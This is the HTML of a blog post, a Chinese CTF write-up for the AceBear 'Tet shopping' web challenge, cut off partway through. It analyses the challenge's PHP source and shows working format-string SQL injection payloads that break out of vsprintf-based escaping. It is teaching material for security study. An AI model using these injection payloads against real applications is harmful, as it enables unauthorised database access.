@@ -1,0 +1,1187 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="cqIhQLk06F" />
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,writeup,web," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Chybeta" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="本文首发于：阿里先知安全社区：AceBear Security Contest-Tet shopping-writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AceBear Security Contest-Tet shopping-writeup">
+<meta property="og:url" content="http://chybeta.github.io/2018/01/31/AceBear-Security-Contest-Tet-shopping-writeup/index.html">
+<meta property="og:site_name" content="Chybeta">
+<meta property="og:description" content="本文首发于：阿里先知安全社区：AceBear Security Contest-Tet shopping-writeup">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/14.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/1.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/2.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/3.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/4.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/5.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/6.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/8.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/7.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/10.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/11.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/12.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/13.jpg?raw=true">
+<meta property="og:updated_time" content="2018-02-03T11:43:31.696Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="AceBear Security Contest-Tet shopping-writeup">
+<meta name="twitter:description" content="本文首发于：阿里先知安全社区：AceBear Security Contest-Tet shopping-writeup">
+<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/14.jpg?raw=true">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://chybeta.github.io/2018/01/31/AceBear-Security-Contest-Tet-shopping-writeup/"/>
+
+
+
+
+
+  <title> AceBear Security Contest-Tet shopping-writeup | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9c37af8d1f8c5ce0455bd146b47dd7c";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Chybeta</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <p class="site-subtitle"></p>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-link">
+          <a href="/link" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br />
+            
+            朋友
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2018/01/31/AceBear-Security-Contest-Tet-shopping-writeup/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="chybeta">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Chybeta">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                AceBear Security Contest-Tet shopping-writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-31T10:33:11+08:00">
+                2018-01-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup-Web/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup:Web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+             <span id="/2018/01/31/AceBear-Security-Contest-Tet-shopping-writeup/" class="leancloud_visitors" data-flag-title="AceBear Security Contest-Tet shopping-writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>本文首发于：<a href="https://xianzhi.aliyun.com/forum/topic/2013" target="_blank" rel="external">阿里先知安全社区：AceBear Security Contest-Tet shopping-writeup</a><br><a id="more"></a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这几天研究了一下AceBear Security Contest的Tet shopping题目，整体思路以及涉及的知识点如下：</p>
+<ul>
+<li>格式化字符串sql注入漏洞</li>
+<li>基于gopher协议的SSRF攻击来完成对mysql未授权访问漏洞的利用</li>
+<li>时间盲注</li>
+</ul>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/14.jpg?raw=true" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Website: Link http://128.199.179.156/</div><div class="line">Source: source http://128.199.179.156/src.tar.gz</div></pre></td></tr></table></figure></p>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h2><p>点开链接，发现有一个登陆框，提供了注册和登陆功能。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/1.jpg?raw=true" alt=""></p>
+<p>完成注册和登陆后，发现有购物功能，你可以买<code>Banh chung</code>或者<code>Banh tet</code>，购买完后会出现下图中的红框框起部分：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/2.jpg?raw=true" alt=""></p>
+<p>接下里看源码。源码大体结构如下，img文件夹里存放了图片，backup.sh是脚本文件，里面涉及了mysql操作和flag的保存，具体内容见后。cfg.php文件主要定义了sql操作比如查询等等，db.sql是sql文件，func.php包含有功能比如购买等等，index.php即主页，info.php用来显示每样物品的具体信息，item.php显示购买信息，login.php和logout.php分别是登陆与登出：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">│  backup.sh</div><div class="line">│  cfg.php</div><div class="line">│  db.sql</div><div class="line">│  func.php</div><div class="line">│  index.php</div><div class="line">│  info.php</div><div class="line">│  item.php</div><div class="line">│  login.php</div><div class="line">│  logout.php</div><div class="line">│  ok.jpg</div><div class="line">│</div><div class="line">└─img</div><div class="line">        banh-chung<span class="number">-22.</span>jpg</div><div class="line">        banh_chung.jpg</div><div class="line">        banh_tet.jpg</div></pre></td></tr></table></figure></p>
+<p>由于初次点开，会直接跳转到login.php进行注册和登陆，因此我们先来看看 login.php，限于篇幅仅示出部分关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">session_start();</div><div class="line"><span class="keyword">include</span> <span class="string">"cfg.php"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (isLogin())</div><div class="line">	<span class="keyword">die</span>(header(<span class="string">"Location: index.php"</span>));</div><div class="line">$msg = <span class="string">''</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>]))&#123;</div><div class="line">	<span class="keyword">switch</span>($_POST[<span class="string">'action'</span>])&#123;</div><div class="line">		<span class="keyword">case</span> <span class="string">'login'</span>:</div><div class="line">			<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"user"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"user"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"passwd"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"passwd"</span>])) &#123;</div><div class="line">				$prepare_qr = $jdb-&gt;addParameter(<span class="string">"SELECT uid from users where user=%s and passwd=sha1(%s)"</span>, $_POST[<span class="string">"user"</span>], $_POST[<span class="string">'passwd'</span>]);</div><div class="line">				$result = $jdb-&gt;fetch_assoc($prepare_qr);</div><div class="line">				<span class="keyword">if</span>(count($result)===<span class="number">1</span>)&#123;</div><div class="line">					$_SESSION[<span class="string">"id"</span>] = (int)$result[<span class="number">0</span>][<span class="string">"uid"</span>];</div><div class="line">					$msg = <span class="string">"Login successful!"</span>;</div><div class="line">					<span class="keyword">die</span>(header(<span class="string">"Location: index.php"</span>));</div><div class="line">				&#125;<span class="keyword">else</span>&#123;</div><div class="line">					$msg = <span class="string">"Invalid information!"</span>;</div><div class="line">				&#125;</div><div class="line"></div><div class="line">			&#125;<span class="keyword">else</span>&#123;</div><div class="line">				$msg = <span class="string">"Missing detail!"</span>;</div><div class="line">			&#125;</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="string">'register'</span>:</div><div class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"user"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"user"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"passwd"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"passwd"</span>]))&#123;</div><div class="line">			$prepare_qr = $jdb-&gt;addParameter(<span class="string">"SELECT uid from users where user=%s"</span>, $_POST[<span class="string">'user'</span>]);</div><div class="line">			$result = $jdb-&gt;fetch_assoc($prepare_qr);</div><div class="line">			<span class="keyword">if</span>(count($result)&gt;<span class="number">0</span>)&#123;</div><div class="line">				$msg = <span class="string">"User exists!"</span>;</div><div class="line">			&#125;<span class="keyword">else</span>&#123;</div><div class="line">			$prepare_qr = $jdb-&gt;addParameter(<span class="string">"INSERT INTO users VALUES (0, %s, sha1(%s))"</span>	, $_POST[<span class="string">"user"</span>], $_POST[<span class="string">"passwd"</span>]);</div><div class="line">			$result = $jdb-&gt;insert_data($prepare_qr);</div><div class="line">			<span class="keyword">if</span>($result)</div><div class="line">				$msg = <span class="string">"Register successful!"</span>;</div><div class="line">			<span class="keyword">else</span></div><div class="line">				$msg = <span class="string">"Register failed!"</span>;</div><div class="line">			&#125;</div><div class="line"></div><div class="line">		&#125;<span class="keyword">else</span>&#123;</div><div class="line">			$msg = <span class="string">"Missing detail!"</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">break</span>;</div><div class="line"></div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> $msg;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>先看注册register部分。在接受<code>user</code>和<code>passwd</code>后，先执行了下面这两条语句:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$prepare_qr = $jdb-&gt;addParameter(<span class="string">"SELECT uid from users where user=%s"</span>, $_POST[<span class="string">'user'</span>]);</div><div class="line">$result = $jdb-&gt;fetch_assoc($prepare_qr);</div></pre></td></tr></table></figure></p>
+<p><code>$prepare_qr</code>类似php中的预编译语句，然后再通过<code>$jdb-&gt;fetch_assoc()</code>获取数据。倘若结果为空/零，则执行插入（即注册）操作，类似的先执行了出题者自己写的“预编译”方法，之后在执行插入：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$prepare_qr = $jdb-&gt;addParameter(<span class="string">"INSERT INTO users VALUES (0, %s, sha1(%s))"</span>	, $_POST[<span class="string">"user"</span>], $_POST[<span class="string">"passwd"</span>]);</div><div class="line">$result = $jdb-&gt;insert_data($prepare_qr);</div></pre></td></tr></table></figure></p>
+<p>以上与数据库有交互的操作，均定义在<code>cfg.php</code> 中，<code>Jdb</code>是其中的类，而其构造方法是链接数据库，部分关键源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jdb</span></span>&#123;</div><div class="line">	...</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">fetch_assoc</span><span class="params">($qr)</span></span>&#123;</div><div class="line">		$qq = mysqli_query(<span class="keyword">$this</span>-&gt;conn, $qr);</div><div class="line"></div><div class="line">		$return = <span class="keyword">array</span>();</div><div class="line">		<span class="keyword">while</span>($req = mysqli_fetch_assoc($qq))&#123;</div><div class="line">			array_push($return, $req);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> $return;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">insert_data</span><span class="params">($qr)</span></span>&#123;</div><div class="line">		<span class="keyword">return</span> mysqli_query(<span class="keyword">$this</span>-&gt;conn, $qr);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">addParameter</span><span class="params">($qr, $args)</span></span>&#123;</div><div class="line">		<span class="keyword">if</span>(is_null($qr))&#123;</div><div class="line">			<span class="keyword">return</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>(strpos($qr, <span class="string">'%'</span>) === <span class="keyword">false</span> ) &#123;</div><div class="line">			<span class="keyword">return</span>;</div><div class="line">		&#125;</div><div class="line">		$a rgs = func_get_args();</div><div class="line">		array_shift($args);</div><div class="line">		<span class="keyword">if</span>(is_array($args[<span class="number">0</span>]) &amp;&amp; count($args)==<span class="number">1</span>)&#123;</div><div class="line">			$args = $args[<span class="number">0</span>];</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">foreach</span>($args <span class="keyword">as</span> $arg)&#123;</div><div class="line">			<span class="keyword">if</span>(!is_scalar($arg) &amp;&amp; !is_null($arg))&#123;</div><div class="line"></div><div class="line">				<span class="keyword">return</span>;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		$qr = str_replace( <span class="string">"'%s'"</span>, <span class="string">'%s'</span>, $qr);</div><div class="line">		$qr = str_replace( <span class="string">'"%s"'</span>, <span class="string">'%s'</span>, $qr);</div><div class="line">		$qr = preg_replace( <span class="string">'|(?&lt;!%)%f|'</span> , <span class="string">'%F'</span>, $qr);</div><div class="line">		$qr = preg_replace( <span class="string">'|(?&lt;!%)%s|'</span>, <span class="string">"'%s'"</span>, $qr);</div><div class="line"></div><div class="line">		array_walk($args, <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'ebr'</span> ) );</div><div class="line">		<span class="keyword">return</span> @vsprintf($qr, $args);</div><div class="line"></div><div class="line">	&#125;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">ebr</span><span class="params">(&amp;$st )</span> </span>&#123;</div><div class="line">		<span class="keyword">if</span> (!is_float($st))</div><div class="line">			$st = <span class="keyword">$this</span>-&gt;_re($st);</div><div class="line">	&#125;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">_re</span><span class="params">($st)</span> </span>&#123;</div><div class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;conn) &#123;</div><div class="line">			<span class="keyword">return</span> mysqli_real_escape_string(<span class="keyword">$this</span>-&gt;conn, $st);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">return</span> addslashes($st);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line">$jdb = <span class="keyword">new</span> Jdb();</div><div class="line"><span class="keyword">include</span> <span class="string">"func.php"</span>;</div></pre></td></tr></table></figure></p>
+<p>从注册的流程可以看到sql语句均经过<code>addParameter</code>后再进一步执行。在<code>addParameter</code>中，可以看到参数先经过了<code>mysqli_real_escape_string</code>，之后再通过<code>vsprintf</code>写入sql语句，这让人想起经典的<a href="https://paper.seebug.org/386/" target="_blank" rel="external">wordpress 格式化字符串sql注入漏洞</a>，文章中提到了利用条件：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/3.jpg?raw=true" alt=""></p>
+<p>我们在第一次格式化字符串操作中写入格式化字符串如<code>%s</code>，然后要在第二次格式化字符串操作中完成对第一步写入的格式化字符串的控制。单单就login.php中的操作而言，由于注册/登陆都仅仅涉及了一次<code>addParameter</code>，也即只涉及一次的<code>vsprintf</code>，因此此处的利用难以成功。</p>
+<h2 id="格式化字符串sql注入漏洞"><a href="#格式化字符串sql注入漏洞" class="headerlink" title="格式化字符串sql注入漏洞"></a>格式化字符串sql注入漏洞</h2><p>通过进一步的审计，在info.php发现了一处连续两次调用<code>addParameter</code>的代码：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/4.jpg?raw=true" alt=""></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$prepare_qr = $jdb-&gt;addParameter(<span class="string">"SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s"</span>,  $_GET[<span class="string">'uid'</span>]);</div><div class="line">$prepare_qr = $jdb-&gt;addParameter($prepare_qr.<span class="string">' and user=%s'</span>, $username);</div><div class="line">$result = $jdb-&gt;fetch_assoc($prepare_qr);</div></pre></td></tr></table></figure>
+<p>在第一个<code>addParameter</code>中<code>$_GET[&#39;uid&#39;]</code>完全可控，第二个<code>addParameter</code>中，<code>$username</code>是通过SESSION来查询数据库找出对应的用户名，这个用户名即注册时的用户名，也就是也完全可控。测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'cfg.php'</span>;</div><div class="line">$username=$_GET[<span class="string">'username'</span>];</div><div class="line">$prepare_qr = $jdb-&gt;addParameter(<span class="string">"SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s"</span>,  $_GET[<span class="string">'uid'</span>]);</div><div class="line">print_r(<span class="string">"First:&lt;br&gt;"</span>);</div><div class="line">print_r($prepare_qr.<span class="string">'&lt;br&gt;'</span>);</div><div class="line"></div><div class="line">$prepare_qr = $jdb-&gt;addParameter($prepare_qr.<span class="string">' and user=%s'</span>, $username);</div><div class="line">print_r(<span class="string">"Second:&lt;br&gt;"</span>);</div><div class="line">print_r($prepare_qr);</div></pre></td></tr></table></figure></p>
+<p>第一种payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/AceBear/tetshopping/index3.php?uid=%1$&apos; or 1=1%23&amp;username=chybeta</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/5.jpg?raw=true" alt=""></p>
+<p>更具体的原因可以参见：<a href="https://chybeta.github.io/2017/11/18/LCTF-2017-Simple-blog-writeup/#%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2sql%E6%B3%A8%E5%85%A5">LCTF 2017-Simple blog-writeup </a></p>
+<p>第二种payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/AceBear/tetshopping/index3.php?uid=%1$c or 1=1%23&amp;username=39</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/6.jpg?raw=true" alt=""></p>
+<p>这是因为在第二次的格式化字符串<code>vsprintf</code>中，<code>%1$c</code>相当于选择第一个参数，而<code>%c</code>会将其转化为对应的ascii字符。这里的第一个参数<code>$username</code>为<code>39</code>，转化后变为<code>&#39;</code>，从而逃逸。</p>
+<p>接下里寻找目标，在<code>backup.sh</code>中：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"[+] Creating flag user and flag table."</span></div><div class="line">mysql -h 127.0.0.1 -uroot -p &lt;&lt;<span class="string">'SQL'</span></div><div class="line">CREATE DATABASE IF NOT EXISTS `flag` /*!40100 DEFAULT CHARACTER SET utf8 */;</div><div class="line">USE `flag`;</div><div class="line">DROP TABLE IF EXISTS `flag`;</div><div class="line">CREATE TABLE `flag` (</div><div class="line">  `flag` VARCHAR(1000)</div><div class="line">);</div><div class="line">CREATE USER <span class="string">'fl4g_m4n4g3r'</span>@<span class="string">'localhost'</span>;</div><div class="line">GRANT USAGE ON *.* TO <span class="string">'fl4g_m4n4g3r'</span>@<span class="string">'localhost'</span>;</div><div class="line">GRANT SELECT ON `flag`.* TO <span class="string">'fl4g_m4n4g3r'</span>@<span class="string">'localhost'</span>;</div><div class="line">SQL</div><div class="line"></div><div class="line"><span class="built_in">echo</span> -n <span class="string">"[+] Please input the flag:"</span></div><div class="line"><span class="built_in">read</span> flag</div><div class="line"></div><div class="line">mysql -h 127.0.0.1 -uroot -p &lt;&lt;SQL</div><div class="line">INSERT INTO flag.flag VALUES (<span 